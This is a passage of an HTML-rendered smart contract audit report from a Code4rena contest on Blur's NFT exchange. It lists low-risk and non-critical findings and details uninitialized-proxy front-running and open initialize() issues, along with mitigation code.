aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, hardhat</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement an initializer for Pool similarly to the <code>Exchange.sol</code> contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/186#issuecomment-1341620874\">nonfungible47 (Blur) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p><code>initialize</code> function was added to set the pool owner. The function is called when deploying the proxy. </p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 21 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/261\">report highlighted below</a> by <strong>0xSmartContract</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: [<a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/242\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/221\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/219\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/209\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/196\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/168\">Tricko</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/164\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/163\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/161\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/142\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/134\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/120\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/93\">neko_nyaa</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/78\">trustindistrust</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/76\">martin</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/74\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/54\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/45\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/40\">ladboy233</a>, and <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/39\">IllIllI</a>.</em></p>\n<h2 id=\"low-risk-issues-list\" style=\"position:relative;\"><a href=\"#low-risk-issues-list\" aria-label=\"low risk issues list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues List</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Number</th>\n<th align=\"left\">Issues Details</th>\n<th align=\"center\">Context</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[L-01]</td>\n<td align=\"left\">Potential DOS in Contract Inheriting UUPSUpgradeable.sol</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-02]</td>\n<td align=\"left\">initialize() function can be called by anybody</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-03]</td>\n<td align=\"left\">The <code>whenOpen</code> modifier just pauses the <code>execute</code>  and <code>bulkExecute</code> function</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-04]</td>\n<td align=\"left\"><code>_returnDust</code>  function create dirty bits</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-05]</td>\n<td align=\"left\">Critical Address Changes Should Use Two-step Procedure</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td align=\"center\">[L-06]</td>\n<td align=\"left\">Owner can renounce Ownership</td>\n<td align=\"center\">8</td>\n</tr>\n<tr>\n<td align=\"center\">[L-07]</td>\n<td align=\"left\">Loss of precision due to rounding</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-08]</td>\n<td align=\"left\">Require messages are too short and unclear</td>\n<td align=\"center\">7</td>\n</tr>\n<tr>\n<td align=\"center\">[L-09]</td>\n<td align=\"left\">Fee recipient may be address(0)</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-10]</td>\n<td align=\"left\">Exchange.sol  <code>_execute</code> buy.order.side not validated</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>Total 10 issues</p>\n<h2 id=\"non-critical-issues-list\" style=\"position:relative;\"><a href=\"#non-critical-issues-list\" aria-label=\"non critical issues list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Issues List</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Number</th>\n<th align=\"left\">Issues Details</th>\n<th align=\"center\">Context</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[N-01]</td>\n<td align=\"left\">Not using the latest version of OpenZeppelin from dependencies</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-02]</td>\n<td align=\"left\">No same value input control</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-03]</td>\n<td align=\"left\"><code>0 address</code> check</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-04]</td>\n<td align=\"left\">Omissions in Events</td>\n<td align=\"center\">4</td>\n</tr>\n<tr>\n<td align=\"center\">[N-05]</td>\n<td align=\"left\">Add parameter to Event-Emit</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[N-06]</td>\n<td align=\"left\">Include <code>return parameters</code> in <em>NatSpec comments</em></td>\n<td align=\"center\">All Contracts</td>\n</tr>\n<tr>\n<td align=\"center\">[N-07]</td>\n<td align=\"left\">Solidity compiler optimizations can be problematic</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-08]</td>\n<td align=\"left\">NatSpec is missing</td>\n<td align=\"center\">10</td>\n</tr>\n<tr>\n<td align=\"center\">[N-09]</td>\n<td align=\"left\">Signature Malleability of EVM’s ecrecover()</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-10]</td>\n<td align=\"left\">Lines are too long</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[N-11]</td>\n<td align=\"left\">Stop using v != 27 &#x26;&#x26; v != 28 or v == 27</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">[N-12]</td>\n<td align=\"left\"><code>Empty blocks</code> should be <em>removed</em> or <em>Emit</em> something</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[N-13]</td>\n<td align=\"left\">Signature scheme does not support smart contracts</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>Total 13 issues</p>\n<h2 id=\"suggestions\" style=\"position:relative;\"><a href=\"#suggestions\" aria-label=\"suggestions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggestions</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Number</th>\n<th align=\"left\">Suggestion Details</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[S-01]</td>\n<td align=\"left\">Generate perfect code headers every time</td>\n</tr>\n</tbody>\n</table>\n<p>Total 1 suggestion</p>\n<h2 id=\"l-01-potential-dos-in-contract-inheriting-uupsupgradeablesol\" style=\"position:relative;\"><a href=\"#l-01-potential-dos-in-contract-inheriting-uupsupgradeablesol\" aria-label=\"l 01 potential dos in contract inheriting uupsupgradeablesol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Potential DOS in Contract Inheriting <code>UUPSUpgradeable.sol</code></h2>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/scripts/deploy.ts#L18\">https://github.com/code-423n4/2022-11-non-fungible/blob/main/scripts/deploy.ts#L18</a></p>\n<p>The scripts/ folder outlines a number of deployment scripts used by the team. Some of the contracts deployed utilise the ERC1967 upgradeable proxy standard. </p>\n<p>This standard involves first deploying an implementation contract and later a proxy contract which uses the implementation contract as its logic. When users make calls to the proxy contract, the proxy contract will delegate call to the underlying implementation contract. </p>\n<p><code>Exchange.sol</code> implement an <code>initialize()</code> function which aims to replace the role of the <code>constructor()</code> when deploying proxy contracts</p>\n<p><code>Exchange.sol</code> inherits <code>UUPSUpgradeable.sol</code>. It is important that the contract is deployed and initialized in the same transaction to avoid any malicious frontrunning. <code>Exchange.sol</code> may potentially have <code>initialized</code> variable be false, and if this happens, the malicious attacker would take over the control.</p>\n<p>it would be worthwhile to ensure the proxy contract is deployed and initialized in the same transaction, or ensure the <code>initialize()</code> function is callable only by the deployer of the proxy contract. This could be set in the proxy contracts <code>constructor()</code></p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As a result, a malicious attacker could monitor the Ethereum blockchain for bytecode that matches the  contract and frontrun the initialize() transaction to gain ownership of the contract. This can be repeated as a Denial Of Service (DOS) type of attack, effectively preventing  contract deployment, leading to unrecoverable gas expenses.</p>\n<p>Add a control that makes <code>initialize()</code> only call the Deployer Contract;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">DEPLOYER_ADDRESS</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotDeployer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t}</span></span></span></code></pre>\n<p>In another solution; Using the LibRLP library, which makes it possible to pre-calculate Foundry’s contract deploy addresses, and deploy simultaneously using the Atomic transaction feature of Foundry and EVM.</p>\n<p><a href=\"https://twitter.com/transmissions11/status/1518507047943245824?s=20&#x26;t=-SgkBERLJqFRHn7392GrbA\">https://twitter.com/transmissions11/status/1518507047943245824?s=20&#x26;t=-SgkBERLJqFRHn7392GrbA</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Script.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">LibRLP</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../test/utils/LibRLP.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DeployBase</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Script</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">run</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startBroadcast</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk3\">// Precomputed contract addresses, based on contract deploy nonces.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk3\">// tx.origin is the address who will actually broadcast the contract creations below.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BlurExchangeAddewss</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">LibRLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk12\">origin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getNonce</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk12\">origin</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxyaddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">LibRLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk12\">origin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getNonce</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk12\">origin</span><span class=\"mtk1\">) );</span></span></span></code></pre>\n<h2 id=\"l-02--initialize-function-can-be-called-by-anybody\" style=\"position:relative;\"><a href=\"#l-02--initialize-function-can-be-called-by-anybody\" aria-label=\"l 02  initialize function can be called by anybody permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02]  initialize() function can be called by anybody</h2>\n<p><code>initialize()</code> function can be called anybody when the contract is not initialized.</p>\n<p>More importantly, if someone else runs this function, they will have full authority because of the <code>__Ownable_init()</code> function.\nAlso, there is no 0 address check in the address arguments of the initialize() function, which must be defined.</p>\n<p>Here is a definition of <code>initialize()</code> function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">111</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/* Constructor (for ERC1967) */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">112</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t113:         </span><span class=\"mtk10\">IExecutionDelegate</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_executionDelegate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t114:         </span><span class=\"mtk10\">IPolicyManager</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_policyManager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t115:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_oracle</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t116:         </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_blockRange</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">117</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">118</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">__Ownable_init</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">119</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">isOpen</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">120</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">121</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">DOMAIN_SEPARATOR</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_hashDomain</span><span class=\"mtk1\">(</span><span class=\"mtk11\">EIP712Domain</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">122</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">name</span><span class=\"mtk1\">              : </span><span class=\"mtk12\">NAME</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">123</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">version</span><span class=\"mtk1\">           : </span><span class=\"mtk12\">VERSION</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">124</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">chainId</span><span class=\"mtk1\">           : </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">chainid</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">125</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">verifyingContract</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">126</span><span class=\"mtk1\">:         }));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">127</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">128</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">executionDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_executionDelegate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">129</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">policyManager</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_policyManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">130</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">131</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">blockRange</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_blockRange</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">132</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a control that makes <code>initialize()</code> only call the Deployer 